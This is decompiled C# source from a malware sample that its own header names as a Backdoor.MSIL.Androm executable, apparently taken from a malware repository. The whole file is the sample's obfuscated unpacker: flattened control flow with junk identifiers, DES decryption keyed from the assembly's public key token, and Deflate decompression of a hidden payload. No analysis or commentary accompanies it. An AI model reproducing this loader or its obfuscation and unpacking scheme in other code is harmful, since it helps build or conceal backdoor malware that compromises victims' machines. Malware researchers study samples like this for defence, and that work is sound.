// Decompiled with JetBrains decompiler
// Type: DYoFF4BgwIJD1l3wWo.AF28BTt8mxtqCMMO5r
// Assembly: Gmrabnaed, Version=2.1.0.2, Culture=neutral, PublicKeyToken=null
// MVID: CDA996AD-1A6D-1C36-98C5-273C94097B7C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Backdoor.MSIL.Androm.gen-0a8997f5e0f9f8464a5a8f6bad14c335cc37bff50ae66e71f46a904882a0bd1c.exe

using A3lBO3IgUSQDJLYLt4;
using bgZ8QqrbXxU02axgci;
using fXS9TfdO4RvK2kxlUd;
using p5qTxx1mbc4lGXaWHqf;
using phnh3JpOmM0Dbn2viF;
using q24SHp54usLQhlERyh;
using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using TbVPmcOI0QC1ls6aJV;

namespace DYoFF4BgwIJD1l3wWo
{
  internal class AF28BTt8mxtqCMMO5r
  {
    private static readonly object Opnj8wkmL;
    private static readonly int VsBGHt0ax;
    private static readonly int AF2X8BT8m;
    private static readonly MemoryStream JtqPCMMO5;
    private static readonly MemoryStream rGYEoFF4g;
    private static readonly byte JIJWD1l3w;
    private static AF28BTt8mxtqCMMO5r tFtvH2fZbZaUQ8v6KE;

    static AF28BTt8mxtqCMMO5r()
    {
      t7ak2H1Q0w2lkgOsjpn.AnLsSOnzhEvRv();
      AF28BTt8mxtqCMMO5r.JtqPCMMO5 = yplY0jb4hqYvWoJZVQ.IgcwiicNX;
      int num1 = 0;
      if (true)
        goto label_2;
label_1:
      int num2;
      num1 = num2;
label_2:
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_4;
          default:
            AF28BTt8mxtqCMMO5r.rGYEoFF4g = yplY0jb4hqYvWoJZVQ.IgcwiicNX;
            if (true)
            {
              num1 = 1;
              continue;
            }
            goto label_1;
        }
      }
label_4:
      AF28BTt8mxtqCMMO5r.VsBGHt0ax = int.MaxValue;
      AF28BTt8mxtqCMMO5r.AF2X8BT8m = int.MinValue;
      AF28BTt8mxtqCMMO5r.JtqPCMMO5 = new MemoryStream(0);
      AF28BTt8mxtqCMMO5r.rGYEoFF4g = new MemoryStream(0);
      AF28BTt8mxtqCMMO5r.Opnj8wkmL = new object();
    }

    public AF28BTt8mxtqCMMO5r()
    {
      t7ak2H1Q0w2lkgOsjpn.AnLsSOnzhEvRv();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    private static string DuGpjFOoF(Assembly _param0)
    {
      string str = (string) AF28BTt8mxtqCMMO5r.KbR7VLIAehhqdVW0FcE((object) _param0);
      int length = str.IndexOf(',');
      if (length >= 0)
        goto label_5;
label_2:
      return str;
label_5:
      int num1 = 1;
      if (AF28BTt8mxtqCMMO5r.HB4aN2z65ExViaYr2C() != null)
        goto label_6;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 1:
label_4:
            switch (7)
            {
              case 0:
                goto label_4;
              default:
                if (false)
                {
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle = __methodref (AF28BTt8mxtqCMMO5r.DuGpjFOoF);
                }
                str = str.Substring(0, length);
                num1 = !AF28BTt8mxtqCMMO5r.hns6r3H1V7SgFayVYJ() ? 0 : 0;
                continue;
            }
          default:
            goto label_2;
        }
      }
label_6:
      int num2;
      num1 = num2;
      goto label_1;
    }

    private static byte[] jePJlBJGH(Assembly _param0)
    {
      try
      {
        string str = (string) AF28BTt8mxtqCMMO5r.KbR7VLIAehhqdVW0FcE((object) _param0);
        int startIndex = str.IndexOf(NmJCDgvooRKpKK1m3b.Oie1LjaErr(72));
        if (startIndex >= 0)
          goto label_14;
        else
          goto label_18;
label_3:
        byte[] bytes;
        int num1;
        while (true)
        {
          int num2;
          string s;
          switch (num1)
          {
            case 1:
              bytes = BitConverter.GetBytes(long.Parse(s, NumberStyles.HexNumber));
              AF28BTt8mxtqCMMO5r.bysJh7ITHjaljLK2736((object) bytes);
              num2 = 3;
              break;
            case 2:
              goto label_14;
            case 3:
              goto label_17;
            case 4:
label_22:
              switch (1)
              {
                case 0:
                  goto label_22;
                default:
                  if (false)
                    goto label_11;
label_6:
                  startIndex = str.IndexOf(NmJCDgvooRKpKK1m3b.Oie1LjaErr(106));
                  num1 = AF28BTt8mxtqCMMO5r.hns6r3H1V7SgFayVYJ() ? 2 : 0;
                  continue;
label_11:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle = __methodref (AF28BTt8mxtqCMMO5r.jePJlBJGH);
                  goto label_6;
              }
            case 5:
              if (AF28BTt8mxtqCMMO5r.MNGKtrIIGNHQv6f0QEC((object) str, startIndex) != 'n')
              {
                if (AF28BTt8mxtqCMMO5r.hns6r3H1V7SgFayVYJ())
                {
                  num1 = 0;
                  continue;
                }
                break;
              }
              goto label_7;
            case 6:
label_8:
              s = str.Substring(startIndex, 16);
              if (AF28BTt8mxtqCMMO5r.HB4aN2z65ExViaYr2C() == null)
              {
                num1 = 1;
                continue;
              }
              break;
            default:
label_10:
              switch (1)
              {
                case 0:
                  goto label_10;
                default:
                  if (AF28BTt8mxtqCMMO5r.MNGKtrIIGNHQv6f0QEC((object) str, startIndex) != 'N')
                    goto label_8;
                  else
                    goto label_15;
              }
          }
          num1 = num2;
        }
label_7:
        return IcKugeUEc2rwImvNMg.hbX5xU02a;
label_15:
        switch (6)
        {
          case 0:
            goto label_15;
          default:
            goto label_7;
        }
label_17:
        return bytes;
label_14:
        if (startIndex < 0)
        {
label_5:
          switch (7)
          {
            case 0:
              goto label_5;
            default:
              return IcKugeUEc2rwImvNMg.hbX5xU02a;
          }
        }
        else
        {
          startIndex += 15;
          num1 = 5;
          goto label_3;
        }
label_18:
        num1 = 4;
        goto label_3;
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] tMTISfCj5(Stream _param0)
    {
      lock (AF28BTt8mxtqCMMO5r.Opnj8wkmL)
        return AF28BTt8mxtqCMMO5r.DIuy3XEc8(97L, (object) _param0);
    }

    internal static byte[] HoHZpWdbp(long _param0, Stream _param1)
    {
      try
      {
        return AF28BTt8mxtqCMMO5r.tMTISfCj5(_param1);
      }
      catch
      {
        return (byte[]) AF28BTt8mxtqCMMO5r.iB9tK0ImCWTDnEmZVUu(97L, (object) _param1);
      }
    }

    internal static byte[] DIuy3XEc8(long _param0, object _param1)
    {
      Stream stream1 = QnYmryFubkSk64hc9T.Gok6nYmry(_param1);
      Stream stream2 = stream1;
      int num1 = 17;
label_1:
      MemoryStream memoryStream;
      while (true)
      {
        int num2 = num1;
        int position;
        byte[] numArray1;
        ICryptoTransform decryptor;
        byte[] buffer1;
        byte[] outputBuffer;
        while (true)
        {
          int inputBlockSize;
          int num3;
          int num4;
          byte[] buffer2;
          DeflateStream deflateStream;
          byte[] buffer3;
          ushort num5;
          int index;
          byte[] numArray2;
          DESCryptoServiceProvider cryptoServiceProvider;
          int count;
          bool flag;
          switch (num2)
          {
            case 1:
              num5 = ~num5;
              if (((int) num5 & 2) != 0)
              {
                num2 = AF28BTt8mxtqCMMO5r.HB4aN2z65ExViaYr2C() != null ? 0 : 0;
                continue;
              }
              goto case 5;
            case 2:
              buffer3 = zsE4ubJiFw14HhO1bo.SoiAr6uIp(8);
              stream1.Read(buffer3, 0, 8);
              flag = true;
              if (AF28BTt8mxtqCMMO5r.hns6r3H1V7SgFayVYJ())
              {
                num2 = 19;
                continue;
              }
              goto label_1;
            case 3:
              goto label_44;
            case 4:
              stream1.Read(numArray1, 0, (int) (AF28BTt8mxtqCMMO5r.D0x4YTItic1VHXnbu4s((object) stream1) - (long) position));
              byte[] buffer4 = decryptor.TransformFinalBlock(numArray1, 0, (int) (stream1.Length - (long) position));
              AF28BTt8mxtqCMMO5r.JtqPCMMO5.Write(buffer4, 0, (int) lY1LJHxYUJ6hc45XBu.hngknTHPE(buffer4));
              stream2 = (Stream) AF28BTt8mxtqCMMO5r.JtqPCMMO5;
              stream2.Position = 0L;
              memoryStream = AF28BTt8mxtqCMMO5r.JtqPCMMO5;
              num2 = 5;
              continue;
            case 5:
              if (((int) num5 & 8) != 0)
              {
                if (AF28BTt8mxtqCMMO5r.rGYEoFF4g == null)
                {
label_24:
                  switch (2)
                  {
                    case 0:
                      goto label_24;
                    default:
                      if (AF28BTt8mxtqCMMO5r.AF2X8BT8m == int.MinValue)
                      {
label_5:
                        switch (3)
                        {
                          case 0:
                            goto label_5;
                          default:
                            AF28BTt8mxtqCMMO5r.rGYEoFF4g.Capacity = (int) AF28BTt8mxtqCMMO5r.D0x4YTItic1VHXnbu4s((object) stream2) * 2;
                            num2 = 14;
                            continue;
                        }
                      }
                      else
                        goto label_40;
                  }
                }
                else
                  goto case 14;
              }
              else
                goto label_54;
            case 6:
              stream1.ReadByte();
              ++num3;
              num2 = AF28BTt8mxtqCMMO5r.hns6r3H1V7SgFayVYJ() ? 24 : 21;
              continue;
            case 7:
              if (index >= (int) lY1LJHxYUJ6hc45XBu.hngknTHPE(numArray2))
              {
label_12:
                switch (2)
                {
                  case 0:
                    goto label_12;
                  default:
                    goto label_35;
                }
              }
              else
              {
                if (numArray2[index] == (byte) 0)
                {
                  ++index;
                  num2 = 7;
                  continue;
                }
                goto label_47;
              }
            case 8:
              buffer3 = (byte[]) AF28BTt8mxtqCMMO5r.XFY2GvICnY2ANGNswoA(AF28BTt8mxtqCMMO5r.xmWX6tIyiosecs6geKe());
              break;
            case 9:
              goto label_32;
            case 10:
            case 24:
              if (num3 >= 4)
              {
label_58:
                switch (3)
                {
                  case 0:
                    goto label_58;
                  default:
                    if (true)
                      goto label_55;
                    else
                      goto label_17;
                }
              }
              else
                goto case 6;
            case 11:
              stream1.Read(numArray1, 0, inputBlockSize);
              int num6 = decryptor.TransformBlock(numArray1, 0, inputBlockSize, outputBuffer, 0);
              AF28BTt8mxtqCMMO5r.vRr4d2I3PvJyUVKggCH((object) AF28BTt8mxtqCMMO5r.JtqPCMMO5, (object) outputBuffer, 0, num6);
              position += inputBlockSize;
              goto case 20;
            case 12:
label_55:
              num5 = (ushort) AF28BTt8mxtqCMMO5r.CscFupI243asYXq0HRv((object) stream1);
              if (AF28BTt8mxtqCMMO5r.hns6r3H1V7SgFayVYJ())
              {
                num2 = 1;
                continue;
              }
              goto label_1;
            case 13:
              flag = false;
              if (AF28BTt8mxtqCMMO5r.hns6r3H1V7SgFayVYJ())
              {
                num2 = 22;
                continue;
              }
              goto label_1;
            case 14:
            case 28:
              AF28BTt8mxtqCMMO5r.Apc4ICIZBF1GxyavmZ3((object) AF28BTt8mxtqCMMO5r.rGYEoFF4g, 0L);
              deflateStream = new DeflateStream(stream2, CompressionMode.Decompress);
              num2 = 25;
              continue;
            case 15:
              stream1.Read(buffer1, 0, 8);
              AF28BTt8mxtqCMMO5r.Ffe8rNIeMQPV7S5F5OW((object) cryptoServiceProvider, (object) buffer1);
              num2 = 2;
              continue;
            case 16:
              decryptor = cryptoServiceProvider.CreateDecryptor();
              inputBlockSize = decryptor.InputBlockSize;
              num2 = 9;
              continue;
            case 17:
              memoryStream = yplY0jb4hqYvWoJZVQ.IgcwiicNX;
              num3 = 1;
              num2 = 10;
              continue;
            case 18:
label_40:
              AF28BTt8mxtqCMMO5r.CgFnQmIw2AZsFisZk59((object) AF28BTt8mxtqCMMO5r.rGYEoFF4g, AF28BTt8mxtqCMMO5r.AF2X8BT8m);
              num2 = 28;
              continue;
            case 19:
              numArray2 = buffer3;
              index = 0;
              goto case 7;
            case 20:
              if ((long) (position + inputBlockSize) >= stream1.Length)
              {
label_6:
                switch (7)
                {
                  case 0:
                    goto label_6;
                  default:
                    num2 = !AF28BTt8mxtqCMMO5r.hns6r3H1V7SgFayVYJ() ? 2 : 4;
                    continue;
                }
              }
              else
                goto case 11;
            case 21:
              memoryStream = AF28BTt8mxtqCMMO5r.rGYEoFF4g;
              goto label_54;
            case 22:
label_35:
              if (flag)
              {
                if (AF28BTt8mxtqCMMO5r.HB4aN2z65ExViaYr2C() == null)
                {
                  num2 = 8;
                  continue;
                }
                goto label_1;
              }
              else
                break;
            case 23:
label_39:
              if (count >= num4)
                goto label_60;
              else
                goto label_19;
            case 25:
              num4 = 1000;
              buffer2 = zsE4ubJiFw14HhO1bo.SoiAr6uIp(num4);
              goto label_60;
            case 26:
              goto label_26;
            case 27:
label_63:
              switch (3)
              {
                case 0:
                  goto label_63;
                default:
                  num2 = 13;
                  continue;
              }
            default:
label_46:
              switch (1)
              {
                case 0:
                  goto label_46;
                default:
                  cryptoServiceProvider = new DESCryptoServiceProvider();
                  num2 = AF28BTt8mxtqCMMO5r.HB4aN2z65ExViaYr2C() != null ? 1 : 3;
                  continue;
              }
          }
          AF28BTt8mxtqCMMO5r.AH6jpeIcBBbvjLTtu42((object) cryptoServiceProvider, (object) buffer3);
          if (AF28BTt8mxtqCMMO5r.JtqPCMMO5 == null)
          {
label_4:
            switch (1)
            {
              case 0:
                goto label_4;
              default:
                if (AF28BTt8mxtqCMMO5r.VsBGHt0ax == int.MaxValue)
                {
label_13:
                  switch (5)
                  {
                    case 0:
                      goto label_13;
                    default:
                      AF28BTt8mxtqCMMO5r.JtqPCMMO5.Capacity = (int) stream1.Length;
                      break;
                  }
                }
                else
                {
                  AF28BTt8mxtqCMMO5r.JtqPCMMO5.Capacity = AF28BTt8mxtqCMMO5r.VsBGHt0ax;
                  break;
                }
                break;
            }
          }
          AF28BTt8mxtqCMMO5r.JtqPCMMO5.Position = 0L;
          num2 = 16;
          continue;
label_54:
          if (memoryStream != null)
          {
label_15:
            switch (6)
            {
              case 0:
                goto label_15;
              default:
                num2 = !AF28BTt8mxtqCMMO5r.hns6r3H1V7SgFayVYJ() ? 22 : 26;
                continue;
            }
          }
          else
            goto label_27;
label_60:
          count = AF28BTt8mxtqCMMO5r.C5c7EOIRYOCBfU3kY49((object) deflateStream, (object) buffer2, 0, num4);
          if (count > 0)
          {
label_56:
            switch (6)
            {
              case 0:
                goto label_56;
              default:
                AF28BTt8mxtqCMMO5r.rGYEoFF4g.Write(buffer2, 0, count);
                num2 = 23;
                continue;
            }
          }
          else
            goto label_39;
        }
label_17:
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (AF28BTt8mxtqCMMO5r.DIuy3XEc8);
        num1 = 12;
        continue;
label_19:
        switch (3)
        {
          case 0:
            goto label_19;
          default:
            num1 = 21;
            continue;
        }
label_32:
        int outputBlockSize = decryptor.OutputBlockSize;
        outputBuffer = zsE4ubJiFw14HhO1bo.SoiAr6uIp(decryptor.OutputBlockSize);
        numArray1 = zsE4ubJiFw14HhO1bo.SoiAr6uIp(decryptor.InputBlockSize);
        position = (int) stream1.Position;
        num1 = 20;
        continue;
label_44:
        buffer1 = zsE4ubJiFw14HhO1bo.SoiAr6uIp(8);
        num1 = 15;
        continue;
label_47:
        num1 = 27;
      }
label_26:
      return memoryStream.ToArray();
label_27:
      byte[] numArray = zsE4ubJiFw14HhO1bo.SoiAr6uIp((int) checked ((IntPtr) unchecked (AF28BTt8mxtqCMMO5r.D0x4YTItic1VHXnbu4s((object) stream1) - stream1.Position)));
      AF28BTt8mxtqCMMO5r.C5c7EOIRYOCBfU3kY49((object) stream1, (object) numArray, 0, (int) lY1LJHxYUJ6hc45XBu.hngknTHPE(numArray));
      return numArray;
    }

    internal static bool hns6r3H1V7SgFayVYJ() => AF28BTt8mxtqCMMO5r.tFtvH2fZbZaUQ8v6KE == null;

    internal static AF28BTt8mxtqCMMO5r HB4aN2z65ExViaYr2C() => AF28BTt8mxtqCMMO5r.tFtvH2fZbZaUQ8v6KE;

    internal static object KbR7VLIAehhqdVW0FcE([In] object obj0) => (object) ((Assembly) obj0).FullName;

    internal static char MNGKtrIIGNHQv6f0QEC([In] object obj0, [In] int obj1) => ((string) obj0)[obj1];

    internal static void bysJh7ITHjaljLK2736([In] object obj0) => Array.Reverse((Array) obj0);

    internal static object iB9tK0ImCWTDnEmZVUu(long _param0, [In] object obj1) => (object) AF28BTt8mxtqCMMO5r.DIuy3XEc8(_param0, obj1);

    internal static int CscFupI243asYXq0HRv([In] object obj0) => ((Stream) obj0).ReadByte();

    internal static void Ffe8rNIeMQPV7S5F5OW([In] object obj0, [In] object obj1) => ((SymmetricAlgorithm) obj0).IV = (byte[]) obj1;

    internal static object xmWX6tIyiosecs6geKe() => (object) Assembly.GetExecutingAssembly();

    internal static object XFY2GvICnY2ANGNswoA([In] object obj0) => (object) AF28BTt8mxtqCMMO5r.jePJlBJGH((Assembly) obj0);

    internal static void AH6jpeIcBBbvjLTtu42([In] object obj0, [In] object obj1) => ((SymmetricAlgorithm) obj0).Key = (byte[]) obj1;

    internal static void vRr4d2I3PvJyUVKggCH([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3) => ((Stream) obj0).Write((byte[]) obj1, obj2, obj3);

    internal static long D0x4YTItic1VHXnbu4s([In] object obj0) => ((Stream) obj0).Length;

    internal static void CgFnQmIw2AZsFisZk59([In] object obj0, [In] int obj1) => ((MemoryStream) obj0).Capacity = obj1;

    internal static void Apc4ICIZBF1GxyavmZ3([In] object obj0, [In] long obj1) => ((Stream) obj0).Position = obj1;

    internal static int C5c7EOIRYOCBfU3kY49([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3) => ((Stream) obj0).Read((byte[]) obj1, obj2, obj3);
  }
}
